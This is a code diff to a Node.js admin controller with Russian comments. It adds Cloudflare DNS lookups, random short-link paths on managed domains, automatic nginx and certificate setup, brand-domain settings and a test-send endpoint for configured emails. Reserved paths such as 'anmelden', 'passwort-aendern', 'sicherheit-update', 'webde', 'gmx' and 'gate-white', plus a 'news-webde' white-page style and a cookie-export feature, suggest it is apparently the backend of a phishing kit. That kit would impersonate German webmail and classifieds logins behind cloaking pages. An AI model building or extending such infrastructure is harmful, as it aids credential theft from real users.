@@ -1,5 +1,7 @@
 // Controller: configs, downloads, cookies-export, mode/start-page (sloppy — uses with(scope)).
 const path = require('path');
+const https = require('https');
+const crypto = require('crypto');
 const fs = require('fs');
 const os = require('os');
 const { spawn, spawnSync } = require('child_process');
@@ -25,6 +27,93 @@ const {
   deleteProxyFpStatsByFingerprint,
   purgeProxyFpStatsOrphans,
 } = require('../db/database');
+const brandDomains = require('../config/brandDomains');
+const { probeShortDomainHttp } = require('../utils/shortDomainHttpProbe');
+
+/** Читает A @ apex из зоны Cloudflare (реальный origin IP даже при proxied). */
+function fetchCloudflareApexARecord(domain, apiToken, cb) {
+  const d = String(domain || '').trim().toLowerCase();
+  const opts = {
+    hostname: 'api.cloudflare.com',
+    path: '/client/v4/zones?name=' + encodeURIComponent(d),
+    method: 'GET',
+    headers: { Authorization: 'Bearer ' + apiToken }
+  };
+  const req = https.request(opts, function (res) {
+    let data = '';
+    res.on('data', function (chunk) { data += chunk; });
+    res.on('end', function () {
+      let json;
+      try { json = JSON.parse(data); } catch (e) { return cb(new Error('Invalid CF zones response')); }
+      if (!json.success || !json.result || !json.result.length) {
+        return cb(new Error((json.errors && json.errors[0] && json.errors[0].message) || 'CF zone not found'));
+      }
+      const zoneId = json.result[0].id;
+      const opts2 = {
+        hostname: 'api.cloudflare.com',
+        path: '/client/v4/zones/' + zoneId + '/dns_records?type=A&name=' + encodeURIComponent(d),
+        method: 'GET',
+        headers: { Authorization: 'Bearer ' + apiToken }
+      };
+      const req2 = https.request(opts2, function (res2) {
+        let data2 = '';
+        res2.on('data', function (chunk) { data2 += chunk; });
+        res2.on('end', function () {
+          let j2;
+          try { j2 = JSON.parse(data2); } catch (e2) { return cb(new Error('Invalid CF DNS response')); }
+          if (!j2.success || !j2.result || !j2.result.length) {
+            return cb(new Error((j2.errors && j2.errors[0] && j2.errors[0].message) || 'CF A record not found'));
+          }
+          const rec = j2.result[0];
+          const content = (rec && rec.content) ? String(rec.content).trim() : '';
+          cb(null, content);
+        });
+      });
+      req2.on('error', function (e) { cb(e); });
+      req2.end();
+    });
+  });
+  req.on('error', function (e) { cb(e); });
+  req.end();
+}
+
+const RESERVED_SHORT_PATH_SLUGS = new Set([
+  'api', 's', 'admin', 'health', 'ping', 'gate-white', 'download', 'anmelden', 'einloggen',
+  'klein-anmelden', 'passwort-aendern', 'sicherheit', 'sicherheit-pc', 'sicherheit-update',
+  'bitte-am-pc', 'app-update', 'erfolg', 'robots', 'favicon', 'static', 'public', 'assets',
+  'webde', 'gmx', 'klein', 'cgi-bin', 'www'
+]);
+
+function isValidShortPathRedirectUrl(u) {
+  try {
+    const p = new URL(String(u || '').trim());
+    return p.protocol === 'http:' || p.protocol === 'https:';
+  } catch (e) {
+    return false;
+  }
+}
+
+function generateUniquePathSlug(pathLinks) {
+  const existing = pathLinks && typeof pathLinks === 'object' ? pathLinks : {};
+  const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
+  for (let attempt = 0; attempt < 32; attempt++) {
+    let slug = '';
+    const bytes = crypto.randomBytes(12);
+    for (let i = 0; i < 7; i++) slug += chars[bytes[i] % chars.length];
+    if (RESERVED_SHORT_PATH_SLUGS.has(slug) || existing[slug]) continue;
+    return slug;
+  }
+  return crypto.randomBytes(6).toString('hex');
+}
+
+function pathLinksForApi(domain, pathLinks) {
+  const o = pathLinks && typeof pathLinks === 'object' ? pathLinks : {};
+  return Object.keys(o).map(function (slug) {
+    const row = o[slug];
+    const url = row && row.url ? String(row.url) : '';
+    return { slug: slug, url: url, shortUrl: 'https://' + domain + '/' + slug };
+  });
+}
 
 /** ZIP без системной команды `zip` (на многих VPS её нет → «Ошибка создания архива»). */
 function zipFlatDirectoryToFile(dirPath, outZipPath) {
@@ -57,6 +146,44 @@ function zipFlatDirectoryToFile(dirPath, outZipPath) {
     }
     void archive.finalize();
   });
+}
+
+function runShortDomainNginxRemoveSync(domain, projectRoot) {
+  const script = path.join(projectRoot, 'scripts', 'remove-short-domain-nginx.sh');
+  if (!fs.existsSync(script)) {
+    return { ok: false, detail: 'remove-short-domain-nginx.sh не найден' };
+  }
+  const isRoot = typeof process.getuid === 'function' && process.getuid() === 0;
+  const r = isRoot
+    ? spawnSync('/bin/bash', [script, domain], { cwd: projectRoot, encoding: 'utf8', timeout: 120000, env: process.env })
+    : spawnSync('sudo', ['-n', '/bin/bash', script, domain], { cwd: projectRoot, encoding: 'utf8', timeout: 120000, env: process.env });
+  const out = ((r.stdout || '') + '\n' + (r.stderr || '')).trim();
+  return { ok: r.status === 0, status: r.status, out: out || undefined, spawnError: r.error };
+}
+
+function triggerShortDomainNginxProvision(domain, projectRoot) {
+  if (/^1|true|yes$/i.test(String(process.env.SHORT_DOMAIN_SKIP_NGINX || '').trim())) return;
+  const email = String(process.env.CERTBOT_EMAIL || '').trim();
+  if (!email) {
+    console.warn('[short-domains] CERTBOT_EMAIL не задан — авто nginx/ssl отключён');
+    return;
+  }
+  const setupScript = path.join(projectRoot, 'scripts', 'setup-short-domain-nginx.sh');
+  if (!fs.existsSync(setupScript)) return;
+  const port = String(process.env.PORT || '3001').trim() || '3001';
+  const env = Object.assign({}, process.env);
+  if (!env.SHORT_DOMAIN_STOP_APACHE) env.SHORT_DOMAIN_STOP_APACHE = '1';
+  const args = [setupScript, '--ssl', '--email', email, domain, port];
+  const isRoot = typeof process.getuid === 'function' && process.getuid() === 0;
+  try {
+    const child = isRoot
+      ? spawn('/bin/bash', args, { detached: true, stdio: 'ignore', cwd: projectRoot, env: env })
+      : spawn('sudo', ['-n', '/bin/bash'].concat(args), { detached: true, stdio: 'ignore', cwd: projectRoot, env: env });
+    if (child && child.pid) child.unref();
+    console.log('[short-domains] nginx+ssl provision запущен для', domain, 'pid=', child ? child.pid : '?');
+  } catch (e) {
+    console.warn('[short-domains] provision spawn:', e && e.message ? e.message : e);
+  }
 }
 
 async function handle(scope) {
@@ -1165,14 +1292,65 @@ async function handle(scope) {
     return true;
   }
 
+  if (pathname === '/api/config/brand-domains' && req.method === 'GET') {
+    if (!checkAdminAuth(req, res)) return;
+    return send(res, 200, brandDomains.getApiPayload());
+  }
+
+  if (pathname === '/api/config/brand-domains' && req.method === 'POST') {
+    if (!checkAdminAuth(req, res)) return;
+    let body = '';
+    req.on('data', (chunk) => { body += chunk; });
+    req.on('end', () => {
+      let json = {};
+      try { json = JSON.parse(body || '{}'); } catch {}
+      try {
+        brandDomains.saveFromAdmin(json);
+        return send(res, 200, Object.assign({ ok: true }, brandDomains.getApiPayload()));
+      } catch (e) {
+        const code = e && e.statusCode === 400 ? 400 : 500;
+        return send(res, code, { ok: false, error: (e && e.message) || String(e) });
+      }
+    });
+    return true;
+  }
+
+  if (pathname === '/api/config/brand-domains' && req.method === 'DELETE') {
+    if (!checkAdminAuth(req, res)) return;
+    try {
+      brandDomains.clearFileAndReload();
+      return send(res, 200, Object.assign({ ok: true, reset: true }, brandDomains.getApiPayload()));
+    } catch (e) {
+      return send(res, 500, { ok: false, error: (e && e.message) || String(e) });
+    }
+  }
+
   if (pathname === '/api/config/short-domains' && req.method === 'GET') {
     if (!checkAdminAuth(req, res)) return;
     const list = readShortDomains();
     const arr = Object.keys(list).map(function (d) {
       const o = list[d];
-      return { domain: d, targetUrl: o.targetUrl || '', whitePageStyle: o.whitePageStyle || '', status: o.status || 'pending', message: o.message || '', ns: o.ns || [] };
+      return {
+        domain: d,
+        targetUrl: o.targetUrl || '',
+        whitePageStyle: o.whitePageStyle || '',
+        status: o.status || 'pending',
+        message: o.message || '',
+        ns: o.ns || [],
+        pathLinks: pathLinksForApi(d, o.pathLinks)
+      };
     });
-    return send(res, 200, { list: arr, serverIp: process.env.SHORT_SERVER_IP || '' });
+    const cfTok = (process.env.CLOUDFLARE_API_TOKEN || '').trim();
+    const srvIp = (process.env.SHORT_SERVER_IP || '').trim();
+    const dnsAutoCheck = !!(srvIp && cfTok);
+    return send(res, 200, {
+      list: arr,
+      serverIp: process.env.SHORT_SERVER_IP || '',
+      dnsAutoCheck: dnsAutoCheck,
+      /** Авто-проверка pending по HTTP(S), без CF/IP в .env */
+      siteAutoCheck: true,
+      shortDomainCheckMode: 'http'
+    });
   }
 
   if (pathname === '/api/config/short-domains' && req.method === 'POST') {
@@ -1183,21 +1361,64 @@ async function handle(scope) {
       let json = {};
       try { json = JSON.parse(body || '{}'); } catch {}
       let domain = (json.domain || '').trim().toLowerCase().replace(/^https?:\/\//, '').split('/')[0].replace(/^www\./, '');
-      const targetUrl = (json.targetUrl || '').trim();
+      const gateTargetUrl = (json.targetUrl || '').trim();
+      const pathLinkUrl = (json.pathLinkUrl || json.shortenUrl || '').trim();
       const whitePageStyle = (json.whitePageStyle || '').trim() === 'news-webde' ? 'news-webde' : '';
       if (!domain) return send(res, 400, { ok: false, error: 'domain required' });
+      if (pathLinkUrl && !isValidShortPathRedirectUrl(pathLinkUrl)) {
+        return send(res, 400, { ok: false, error: 'Некорректная ссылка для сокращения (нужен http:// или https://)' });
+      }
       const list = readShortDomains();
       const serverIp = (process.env.SHORT_SERVER_IP || '').trim();
       const cfToken = (process.env.CLOUDFLARE_API_TOKEN || '').trim();
       const existing = list[domain];
-      const entry = existing
-        ? Object.assign({}, existing, { targetUrl: targetUrl || existing.targetUrl || '', whitePageStyle: whitePageStyle || existing.whitePageStyle || '' })
-        : { targetUrl: targetUrl || '', whitePageStyle: whitePageStyle, status: 'pending', message: '', ns: [], createdAt: new Date().toISOString() };
+
+      function attachPathLink(entry) {
+        entry.pathLinks = entry.pathLinks && typeof entry.pathLinks === 'object' ? entry.pathLinks : {};
+        const slug = generateUniquePathSlug(entry.pathLinks);
+        entry.pathLinks[slug] = { url: pathLinkUrl, createdAt: new Date().toISOString() };
+        return slug;
+      }
+
+      function payloadWithPath(entry, slugOpt) {
+        const base = { ok: true, domain: domain, status: entry.status || 'pending', message: entry.message || '' };
+        if (slugOpt) {
+          base.slug = slugOpt;
+          base.shortUrl = 'https://' + domain + '/' + slugOpt;
+          base.pathLinks = pathLinksForApi(domain, entry.pathLinks);
+        }
+        return base;
+      }
+
       if (existing) {
+        const entry = Object.assign({}, existing, {
+          targetUrl: gateTargetUrl || existing.targetUrl || '',
+          whitePageStyle: whitePageStyle || existing.whitePageStyle || ''
+        });
+        if (pathLinkUrl) {
+          const slug = attachPathLink(entry);
+          list[domain] = entry;
+          writeShortDomains(list);
+          return send(res, 200, payloadWithPath(entry, slug));
+        }
         list[domain] = entry;
         writeShortDomains(list);
-        return send(res, 200, { ok: true, domain: domain, status: entry.status || 'pending', message: entry.message || '' });
+        return send(res, 200, Object.assign({ pathLinks: pathLinksForApi(domain, entry.pathLinks) }, payloadWithPath(entry, null)));
       }
+
+      const entry = {
+        targetUrl: gateTargetUrl || '',
+        whitePageStyle: whitePageStyle,
+        status: 'pending',
+        message: '',
+        ns: [],
+        createdAt: new Date().toISOString()
+      };
+      let slugForNew = null;
+      if (pathLinkUrl) {
+        slugForNew = attachPathLink(entry);
+      }
+
       if (cfToken && serverIp) {
         addShortDomainToCloudflare(domain, serverIp, cfToken, function (err, ns) {
           if (err) {
@@ -1205,19 +1426,28 @@ async function handle(scope) {
             entry.message = err.message || 'Cloudflare error';
             list[domain] = entry;
             writeShortDomains(list);
-            return send(res, 200, { ok: true, domain: domain, status: 'error', message: entry.message, list: list });
+            const p = payloadWithPath(entry, slugForNew);
+            p.status = 'error';
+            p.message = entry.message;
+            return send(res, 200, p);
           }
           entry.ns = ns || [];
           entry.message = ns && ns.length ? 'В Dynadot укажите NS: ' + ns.join(', ') : '';
           list[domain] = entry;
           writeShortDomains(list);
-          send(res, 200, { ok: true, domain: domain, status: 'pending', ns: entry.ns, message: entry.message });
+          triggerShortDomainNginxProvision(domain, PROJECT_ROOT);
+          const out = Object.assign({ ns: entry.ns }, payloadWithPath(entry, slugForNew));
+          out.message = entry.message;
+          send(res, 200, out);
         });
       } else {
         entry.message = serverIp ? 'Добавьте домен в Cloudflare, A запись на ' + serverIp + ', в Dynadot укажите NS Cloudflare.' : 'Укажите SHORT_SERVER_IP и CLOUDFLARE_API_TOKEN в .env для автодобавления в CF.';
         list[domain] = entry;
         writeShortDomains(list);
-        send(res, 200, { ok: true, domain: domain, status: 'pending', message: entry.message, serverIp: serverIp || '' });
+        triggerShortDomainNginxProvision(domain, PROJECT_ROOT);
+        const out = Object.assign({ serverIp: serverIp || '' }, payloadWithPath(entry, slugForNew));
+        out.message = entry.message;
+        send(res, 200, out);
       }
     });
     return true;
@@ -1235,19 +1465,58 @@ async function handle(scope) {
       const list = readShortDomains();
       if (!list[domain]) return send(res, 404, { ok: false, error: 'domain not in list' });
       const serverIp = (process.env.SHORT_SERVER_IP || '').trim();
-      if (!serverIp) return send(res, 200, { ok: false, status: 'error', message: 'SHORT_SERVER_IP не задан' });
-      dns.resolve4(domain, function (err, addresses) {
-        if (err || !addresses || addresses.length === 0) {
-          list[domain].status = 'error';
-          list[domain].message = err ? (err.code || err.message) : 'DNS не резолвится';
+      const cfToken = (process.env.CLOUDFLARE_API_TOKEN || '').trim();
+
+      probeShortDomainHttp(domain, function (probeErr, probeResult) {
+        if (probeResult && probeResult.ok) {
+          list[domain].status = 'ready';
+          list[domain].message = '';
           writeShortDomains(list);
-          return send(res, 200, { ok: true, domain: domain, status: 'error', message: list[domain].message });
+          return send(res, 200, {
+            ok: true,
+            domain: domain,
+            status: 'ready',
+            message: '',
+            probeStatus: probeResult.statusCode,
+            probeUrl: probeResult.finalUrl || ''
+          });
         }
-        const match = addresses.some(function (a) { return a === serverIp; });
-        list[domain].status = match ? 'ready' : 'error';
-        list[domain].message = match ? '' : 'IP домена ' + addresses[0] + ' не совпадает с сервером ' + serverIp;
-        writeShortDomains(list);
-        send(res, 200, { ok: true, domain: domain, status: list[domain].status, message: list[domain].message });
+
+        const baseSite = (probeResult && probeResult.message) || (probeErr && probeErr.message) || 'нет ответа';
+        function finishError(msg) {
+          list[domain].status = 'error';
+          list[domain].message = msg;
+          writeShortDomains(list);
+          send(res, 200, { ok: true, domain: domain, status: 'error', message: msg });
+        }
+
+        dns.resolve4(domain, function (dnsErr, addresses) {
+          let msg = 'Сайт не отвечает нормально: ' + baseSite + '.';
+          if (!dnsErr && addresses && addresses.length) {
+            msg += ' Публичный DNS A: ' + addresses.join(', ');
+            if (serverIp && addresses.indexOf(serverIp) === -1) {
+              msg += ' (не равен SHORT_SERVER_IP — за Cloudflare это нормально)';
+            }
+          } else if (dnsErr) {
+            msg += ' DNS: ' + (dnsErr.code || dnsErr.message || '?');
+          }
+
+          if (cfToken) {
+            fetchCloudflareApexARecord(domain, cfToken, function (cfErr, originIp) {
+              if (!cfErr && originIp) {
+                msg += ' В зоне CF A @: ' + originIp;
+                if (serverIp && originIp !== serverIp) {
+                  msg += ' (SHORT_SERVER_IP в .env: ' + serverIp + ')';
+                }
+              } else if (cfErr) {
+                msg += ' CF API: ' + ((cfErr && cfErr.message) || '?');
+              }
+              finishError(msg);
+            });
+            return;
+          }
+          finishError(msg);
+        });
       });
     });
     return true;
@@ -1256,12 +1525,27 @@ async function handle(scope) {
   if (pathname === '/api/config/short-domains' && req.method === 'DELETE') {
     if (!checkAdminAuth(req, res)) return;
     const domain = (parsed.query.domain || '').trim().toLowerCase().split('/')[0];
+    const slug = (parsed.query.slug || '').trim().replace(/[^a-zA-Z0-9_-]/g, '');
     if (!domain) return send(res, 400, { ok: false, error: 'domain required' });
     const list = readShortDomains();
     if (!(domain in list)) return send(res, 404, { ok: false, error: 'not found' });
+    if (slug) {
+      const entry = list[domain];
+      if (!entry.pathLinks || !entry.pathLinks[slug]) return send(res, 404, { ok: false, error: 'slug not found' });
+      delete entry.pathLinks[slug];
+      if (Object.keys(entry.pathLinks).length === 0) delete entry.pathLinks;
+      list[domain] = entry;
+      writeShortDomains(list);
+      return send(res, 200, { ok: true, pathLinks: pathLinksForApi(domain, entry.pathLinks) });
+    }
     delete list[domain];
     writeShortDomains(list);
-    send(res, 200, { ok: true });
+    const rm = runShortDomainNginxRemoveSync(domain, PROJECT_ROOT);
+    const payload = { ok: true, nginxRemoved: rm.ok };
+    if (!rm.ok && (rm.out || rm.detail || rm.spawnError)) {
+      payload.nginxRemoveWarning = (rm.detail || '') + (rm.out ? '\n' + rm.out : '') + (rm.spawnError ? '\n' + String(rm.spawnError.message || rm.spawnError) : '');
+    }
+    send(res, 200, payload);
     return true;
   }
 
@@ -2018,6 +2302,7 @@ async function handle(scope) {
     if (!checkAdminAuth(req, res)) return;
     const data = readConfigEmail();
     const cur = data.current;
+    const hasImg = !!(cur && cur.image1Base64);
     const out = {
       list: (data.configs || []).map(function (c) { return { id: c.id, name: c.name || c.id }; }),
       currentId: data.currentId || null,
@@ -2025,7 +2310,8 @@ async function handle(scope) {
       senderName: (cur && cur.senderName) || '',
       title: (cur && cur.title) || '',
       html: (cur && cur.html) || '',
-      image1Present: !!(cur && cur.image1Base64)
+      image1Present: hasImg,
+      image1DataUrl: hasImg ? ('data:image/png;base64,' + String(cur.image1Base64)) : ''
     };
     return send(res, 200, out);
   }
@@ -2062,7 +2348,14 @@ async function handle(scope) {
       data.configs = configs;
       data.current = cfg;
       writeConfigEmail(data);
-      return send(res, 200, { ok: true, id: configId });
+      const hasImg = !!(cfg && cfg.image1Base64);
+      const imageTouched = Object.prototype.hasOwnProperty.call(json, 'image1Base64');
+      const out = { ok: true, id: configId };
+      if (imageTouched) {
+        out.image1Present = hasImg;
+        out.image1DataUrl = hasImg ? ('data:image/png;base64,' + String(cfg.image1Base64)) : '';
+      }
+      return send(res, 200, out);
     });
     return true;
   }
@@ -2097,6 +2390,32 @@ async function handle(scope) {
       data.current = cfg;
       writeConfigEmail(data);
       return send(res, 200, { ok: true });
+    });
+    return true;
+  }
+
+  if (pathname === '/api/config/email/send-test' && req.method === 'POST') {
+    if (!checkAdminAuth(req, res)) return;
+    let body = '';
+    req.on('data', (chunk) => { body += chunk; });
+    req.on('end', async () => {
+      let json = {};
+      try {
+        json = JSON.parse(body || '{}');
+      } catch (e) {
+        return send(res, 400, { ok: false, error: 'invalid json' });
+      }
+      const toRaw = json.to != null ? String(json.to).trim() : (json.toEmail != null ? String(json.toEmail).trim() : '');
+      if (!toRaw) return send(res, 400, { ok: false, error: 'Укажите получателя (to)' });
+      const configId = json.id != null && String(json.id).trim() !== '' ? String(json.id).trim() : null;
+      const password = json.password != null ? String(json.password) : '';
+      const result = await sendConfigEmailToAddress(toRaw, password, configId);
+      if (result.ok) {
+        console.log('[send-config-email-test] ' + result.fromEmail + ' → ' + result.toEmail);
+        return send(res, 200, { ok: true, fromEmail: result.fromEmail, toEmail: result.toEmail });
+      }
+      const code = result.statusCode || 500;
+      return send(res, code, { ok: false, error: result.error || 'Ошибка отправки' });
     });
     return true;
   }
